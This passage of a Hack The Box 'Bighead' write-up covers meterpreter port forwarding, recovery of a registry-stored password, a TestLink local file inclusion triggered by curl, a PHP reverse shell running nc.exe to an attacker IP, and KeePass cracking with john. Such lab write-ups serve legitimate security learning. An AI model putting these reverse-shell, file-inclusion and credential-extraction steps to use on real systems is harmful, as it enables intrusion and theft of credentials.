#### From `meterpreter` I wanted to look at the services so I did `ps`, I looked through them and found an interesting service called `BvSshServer.exe`
![](/images/hackthebox/bighead/95.png)
#### I wanted to know the listening port of that ssh server, so I did `netstat`. It was listening on port 2020 :
![](/images/hackthebox/bighead/96.png)
#### So I forwarded that port, We also saw earlier when we went to `code.bighead.htb` it redirected us to `http://127.0.0.1:5080/testlink/login.php`. I wanted to forward that port too to check what's in there. To forward a port through `meterpreter` we can simply do it with `portfwd` :
`portfwd add -l 2020 -p 2020 -r bighead.htb`
<br>
`portfwd add -l 5080 -p 5080 -r bighead.htb`
<br>
![](/images/hackthebox/bighead/97.png)
#### Let's check if that `BvSshServer` is a real ssh server :
![](/images/hackthebox/bighead/98.png)
#### It's working fine, now we need a password to login. We already know the username : `nginx`.
#### I went to `code.bighead.htb` again and after I got redirected to port 5080 on `localhost` I got some `SQL` errors :
![](/images/hackthebox/bighead/99.png)
<br>
<br>
![](/images/hackthebox/bighead/100.png)
#### As you can see it disclosed the root path  of the application : `C:\xampp`. I tried to go there but I got access denied :
![](/images/hackthebox/bighead/101.png)
#### After a lot of enumeration I checked the `registry` and in `HKLM\System\CurrentControlSet\Services\` I found the `registry` for `nignx` (The web server) :
`reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'`
![](/images/hackthebox/bighead/102.png)
<br>
<br>
![](/images/hackthebox/bighead/103.png)
#### Then I looked at the values and I found two interesting ones :
`reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx`
![](/images/hackthebox/bighead/104.png)
```
meterpreter > reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
Enumerating: HKLM\System\CurrentControlSet\Services\nginx

  Keys (2):

        Parameters
        Enum

  Values (12):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName
        Description
        DelayedAutostart
        FailureActionsOnNonCrashFailures
        FailureActions
        Authenticate
        PasswordHash
```
#### `Authenticate` and `PasswordHash`. Let's look at the value :
#### `Authenticate` :
`reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate`
![](/images/hackthebox/bighead/105.png)
```
meterpreter > reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: Authenticate
Type: REG_BINARY
Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
```
#### `PasswordHash` :
`reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash`
![](/images/hackthebox/bighead/106.png)
```
meterpreter > reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: PasswordHash
Type: REG_SZ
Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
```
#### `Authenticate` : `4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000`
#### `PasswordHash` : `336d72676e6333205361797a205472794861726465722e2e2e203b440a`
#### Looks like `hex`, Let's see `Authenticate` : 
![](/images/hackthebox/bighead/107.png)
#### The output was kinda weird, that's because of the null bytes, I removed them then I got the right output :
`4837334270555932557139552d5975677974354659556259302d553837743837`
![](/images/hackthebox/bighead/108.png)
#### So this might be a password : `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`, Let's check `PasswordHash` :
![](/images/hackthebox/bighead/109.png)
#### `3mrgnc3 sayz TryHarder... ;D`, It was just a troll. Anyway we have a password let's try to login to ssh as `nignx` :
![](/images/hackthebox/bighead/110.png)
#### It worked, and by looking at the files I figured out that we are in `C:\xampp` :
![](/images/hackthebox/bighead/111.png)
#### There was also a `user.txt`, I tried to read it but it said that it was a binary file :
![](/images/hackthebox/bighead/112.png)
#### I wanted to check the user but `whoami` wasn't there :
![](/images/hackthebox/bighead/113.png)
#### So I checked `help` and this shell has only some basic commands :
![](/images/hackthebox/bighead/114.png)
#### I know that I'm inside `C:\xampp` now. But what am I searching for anyway ? I went back to the `meterpreter` shell and checked the access log of `nginx` in `C:\nginx\logs` :
![](/images/hackthebox/bighead/115.png)
#### At the beginning of the log I found some requests with the `user-agent` `3mrgnc3` :
![](/images/hackthebox/bighead/116.png)
#### Most of them are HEAD requests, maybe he was testing the buffer overflow I don't really know but anyway we are not looking for that. We are looking for requests to `/testlink`. Because everything we have access to on port 5080 is under `/testlink`.
#### On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to `/testlink/linkto.php` :
![](/images/hackthebox/bighead/117.png)
#### I went to that path and got an error which disclosed the path of the `php` file :
![](/images/hackthebox/bighead/118.png)
```
Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
```
#### The path was `C:\xampp\apps\testlink\htdocs\linkto.php` So I went there and got the `php` file :
![](/images/hackthebox/bighead/119.png)
<br>
<br>
![](/images/hackthebox/bighead/120.png)
<hr>
### LFI in `linkto.php`, User Flag
#### It's a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :
![](/images/hackthebox/bighead/121.png)
#### So I checked `pipercoin.php` :
![](/images/hackthebox/bighead/122.png)
#### `pipercoin.php` :
```
<!--                                                                                                                                        
TODO.. I just added a workaround to the linkto script for now.                                                                              
Nelson.                                                                                                                                     
-->                                                                                                                                         
<?php                                                                                                                                       
echo('PiperCoinAuth');                                                                                                                      
?>
```
#### Nothing interesting, Let's go back to `linkto.php`
#### I noticed here that we can send a POST request with the parameters `PiperID` and `PiperCoinID` : 
```
if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php                                         
        $PiperCoinSess = base64_decode($PiperCoinAuth);                                                                                     
        $PiperCoinAvitar = (string)$PiperCoinSess;}
```
#### `PiperID` is not important but `PiperCoinID` is. It's taking the value of `PiperCoinID` and assigning it to another variable called `$PiperCoinAuth`. After that it's calling [`require_once()`](https://www.php.net/manual/en/function.require-once.php) with `$PiperCoinAuth`.
![](/images/hackthebox/bighead/123.png)
#### The vulnerability here is obvious. If we can control what's in `require_once()` Then we can make it include any `php` file of our choice (Local File Inclusion).
#### I created a simple `php` script to execute `nc.exe` and give me a reverse shell :
![](/images/hackthebox/bighead/124.png)
```
<?php
system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
?>
```
#### I uploaded it and uploaded `nc.exe` to `C:\Users\Nelson\AppData\Local\Temp\` :
![](/images/hackthebox/bighead/125.png)
####  Last step is to exploit the vulnerability. We will send a POST request to `http://code.bighead.htb/testlink/linkto.php` With the parameters `PiperID` (we can leave it empty) and `PiperCoinID` which will be the path of the `php` script (`C:\Users\Nelson\AppData\Local\Temp\rev.php`) :
`curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php"`
![](/images/hackthebox/bighead/126.png)
#### We get a reverse shell immediately. As `nt authority\system` :
![](/images/hackthebox/bighead/127.png)
#### Awesome now we can get root and user flags, right ? well ... no. Let's get the user flag first :
![](/images/hackthebox/bighead/128.png)
#### We owned user !
<br>
<hr>
### Alternate Data Stream in `root.txt`
#### Technically we own root now. But we still need to do some more stuff to get the root flag.
#### I looked in `C:\Users\Administrator\Desktop` and the root flag wasn't there.
![](/images/hackthebox/bighead/129.png)
#### I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but ...
![](/images/hackthebox/bighead/130.png)
#### Gilfoyle's Prayer? Another "Silicon Valley" reference. I terminated the `meterpreter` session I had as `Nelson` then I went to `C:\Users\Nelson\AppData\Local\Temp` and executed `m.exe` to get another `meterpreter` session as `nt authority\system`. After that I uploaded `streams.exe` to check for alternate data streams on root.txt :
![](/images/hackthebox/bighead/131.png)
<br>
<br>
![](/images/hackthebox/bighead/132.png)
<br>
<br>
![](/images/hackthebox/bighead/133.png)
<br>
<br>
`streams C:\Users\Administrator\Desktop\root.txt`
![](/images/hackthebox/bighead/134.png)
#### There is an alternate stream called `Zone.Identifier`, I tried to read it but `type` and `more` didn't work for some reason.
![](/images/hackthebox/bighead/135.png)
<br>
<br>
![](/images/hackthebox/bighead/136.png)
#### After reading [this article](https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/) I did it like this : `more < "C:\Users\Administrator\Desktop\root.txt:Zone.Identifier"` and saved the output to a file and named it `test`
![](/images/hackthebox/bighead/137.png)
<br>
<br>
![](/images/hackthebox/bighead/138.png)
#### When I looked at `test` I found that it was a binary file :
![](/images/hackthebox/bighead/139.png)
#### So I downloaded it to use `file` against it :
![](/images/hackthebox/bighead/140.png)
<br>
<br>
![](/images/hackthebox/bighead/141.png)
#### Keepass password database
<br>
<hr>
### Cracking the Database, Root Flag
>KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -[Wikipedia](https://en.wikipedia.org/wiki/KeePass)

#### I renamed the file to `test.kdbx` :
![](/images/hackthebox/bighead/142.png)
#### Then I used `keepass2` to open it :
![](/images/hackthebox/bighead/143.png)
<br>
<br>
![](/images/hackthebox/bighead/144.png)
#### And of course we need a password and a key. I went back to the shell and checked the configuration file for `keepass` in `C:\Users\Administrator\AppData\Roaming\KeePass`
![](/images/hackthebox/bighead/145.png)
<br>
<br>
![](/images/hackthebox/bighead/146.png)
#### KeePass.config.xml :
```
<?xml version="1.0" encoding="utf-8"?>
<Configuration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<Meta>
		<PreferUserConfiguration>false</PreferUserConfiguration>
		<OmitItemsWithDefaultValues>true</OmitItemsWithDefaultValues>
		<DpiFactorX>1</DpiFactorX>
		<DpiFactorY>1</DpiFactorY>
	</Meta>
	<Application>
		<LastUsedFile>
			<Path>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</Path>
			<CredProtMode>Obf</CredProtMode>
			<CredSaveMode>NoSave</CredSaveMode>
		</LastUsedFile>
		<MostRecentlyUsed>
			<MaxItemCount>12</MaxItemCount>
			<Items>
				<ConnectionInfo>
					<Path>..\..\Users\Administrator\Desktop\chest.kdbx</Path>
					<CredProtMode>Obf</CredProtMode>
					<CredSaveMode>NoSave</CredSaveMode>
				</ConnectionInfo>
			</Items>
		</MostRecentlyUsed>
		<WorkingDirectories>
			<Item>Database@..\..\Users\Administrator\Desktop</Item>
			<Item>KeyFile@..\..\Users\Administrator\Desktop</Item>
		</WorkingDirectories>
		<Start>
			<CheckForUpdate>false</CheckForUpdate>
			<CheckForUpdateConfigured>true</CheckForUpdateConfigured>
		</Start>
		<FileOpening />
		<FileClosing />
		<TriggerSystem>
			<Triggers />
		</TriggerSystem>
		<PluginCompatibility />
	</Application>
	<Logging />
	<MainWindow>
		<X>2</X>
		<Y>2</Y>
		<Width>638</Width>
		<Height>450</Height>
		<SplitterHorizontalFrac>0.8333</SplitterHorizontalFrac>
		<SplitterVerticalFrac>0.25</SplitterVerticalFrac>
		<Layout>Default</Layout>
		<ToolBar />
		<EntryView />
		<TanView />
		<EntryListColumnCollection>
			<Column>
				<Type>Title</Type>
				<Width>90</Width>
			</Column>
			<Column>
				<Type>UserName</Type>
				<Width>90</Width>
			</Column>
			<Column>
				<Type>Password</Type>
				<Width>90</Width>
				<HideWithAsterisks>true</HideWithAsterisks>
			</Column>
			<Column>
				<Type>Url</Type>
				<Width>90</Width>
			</Column>
			<Column>
				<Type>Notes</Type>
				<Width>90</Width>
			</Column>
		</EntryListColumnCollection>
		<EntryListColumnDisplayOrder>0 1 2 3 4</EntryListColumnDisplayOrder>
		<ListSorting>
			<Order>Ascending</Order>
		</ListSorting>
	</MainWindow>
	<UI>
		<TrayIcon />
		<Hiding />
		<StandardFont>
			<Family>Microsoft Sans Serif</Family>
			<Size>8.25</Size>
			<GraphicsUnit>Point</GraphicsUnit>
			<Style>Regular</Style>
			<OverrideUIDefault>false</OverrideUIDefault>
		</StandardFont>
		<PasswordFont>
			<Family>Courier New</Family>
			<Size>8.25</Size>
			<GraphicsUnit>Point</GraphicsUnit>
			<Style>Regular</Style>
			<OverrideUIDefault>false</OverrideUIDefault>
		</PasswordFont>
		<BannerStyle>WinVistaBlack</BannerStyle>
		<DataEditorFont>
			<Family>Microsoft Sans Serif</Family>
			<Size>8.25</Size>
			<GraphicsUnit>Point</GraphicsUnit>
			<Style>Regular</Style>
			<OverrideUIDefault>false</OverrideUIDefault>
		</DataEditorFont>
		<UIFlags>0</UIFlags>
		<KeyCreationFlags>0</KeyCreationFlags>
		<KeyPromptFlags>0</KeyPromptFlags>
	</UI>
	<Security>
		<WorkspaceLocking>
			<LockAfterTime>0</LockAfterTime>
			<LockAfterGlobalTime>0</LockAfterGlobalTime>
		</WorkspaceLocking>
		<Policy />
		<MasterPassword>
			<MinimumLength>0</MinimumLength>
			<MinimumQuality>0</MinimumQuality>
		</MasterPassword>
	</Security>
	<Native />
	<PasswordGenerator>
		<AutoGeneratedPasswordsProfile>
			<GeneratorType>CharSet</GeneratorType>
			<Length>20</Length>
			<CharSetRanges>ULD_______</CharSetRanges>
		</AutoGeneratedPasswordsProfile>
		<LastUsedProfile>
			<GeneratorType>CharSet</GeneratorType>
			<Length>20</Length>
			<CharSetRanges>ULD_______</CharSetRanges>
		</LastUsedProfile>
		<UserProfiles />
	</PasswordGenerator>
	<Defaults>
		<OptionsTabIndex>0</OptionsTabIndex>
		<SearchParameters>
			<ComparisonMode>InvariantCultureIgnoreCase</ComparisonMode>
		</SearchParameters>
		<KeySources>
			<Association>
				<DatabasePath>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</DatabasePath>
				<Password>true</Password>
				<KeyFilePath>..\..\Users\Administrator\Pictures\admin.png</KeyFilePath>
			</Association>
		</KeySources>
	</Defaults>
	<Integration>
		<HotKeyGlobalAutoType>393281</HotKeyGlobalAutoType:>
		<HotKeySelectedAutoType>0</HotKeySelectedAutoType>
		<HotKeyShowWindow>393291</HotKeyShowWindow>
		<HotKeyEntryMenu>0</HotKeyEntryMenu>
		<UrlSchemeOverrides>
			<BuiltInOverridesEnabled>1</BuiltInOverridesEnabled>
			<CustomOverrides />
		</UrlSchemeOverrides>
		<AutoTypeAbortOnWindows />
		<ProxyType>System</ProxyType>
		<ProxyAuthType>Auto</ProxyAuthType>
	</Integration>
	<Custom />
</Configuration>
```
#### Exactly here :
![](/images/hackthebox/bighead/147.png)
#### The key is `admin.png` in `C:\Users\Administrator\Pictures\`. Let's download it :
![](/images/hackthebox/bighead/148.png)
#### admin.png :
![](/images/hackthebox/bighead/admin.png)
#### I wanted to test the key (we still need the password) :
![](/images/hackthebox/bighead/149.png)
<br>
<br>
![](/images/hackthebox/bighead/150.png)
#### I expected `The composite key is invalid` but instead of that I got `The file version is unsupported`. I tried many other version of `keepass` and got the same error. So I was sure that the file itself was corrupted (maybe because of `more`). I downloaded it again with `meterpreter` itself this time :
![](/images/hackthebox/bighead/151.png)
#### Then I renamed it to `db.kdbx` :
![](/images/hackthebox/bighead/152.png)
#### Let's try again :
![](/images/hackthebox/bighead/153.png)
<br>
<br>
![](/images/hackthebox/bighead/154.png)
#### Perfect ! Now we need the password. I used `keepass2john` to put the `kdbx` file in a `john` crackable format (we need the key to do that (`admin.png`))
`keepass2john -k admin.png > db.john`
![](/images/hackthebox/bighead/155.png)
#### Then I used `john` with `rockyou.txt` to crack it :
`john --wordlist=/usr/share/wordlists/rockyou.txt db.john`
![](/images/hackthebox/bighead/156.png)
#### The password is `darkness`. Let's try to open the database :
![](/images/hackthebox/bighead/157.png)
<br>
<br>
![](/images/hackthebox/bighead/158.png)
#### Great ! double-click on `root.txt` and it will copy the flag into our clipboard :
![](/images/hackthebox/bighead/159.png)
#### Let's paste it :
![](/images/hackthebox/bighead/160.png)
#### And finally we can say ... We owned root !
<br>
<br>
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - Irked](/hack-the-box/irked/)
#### Next Hack The Box write-up : [Hack The Box - Lightweight](/hack-the-box/lightweight/)
<hr>
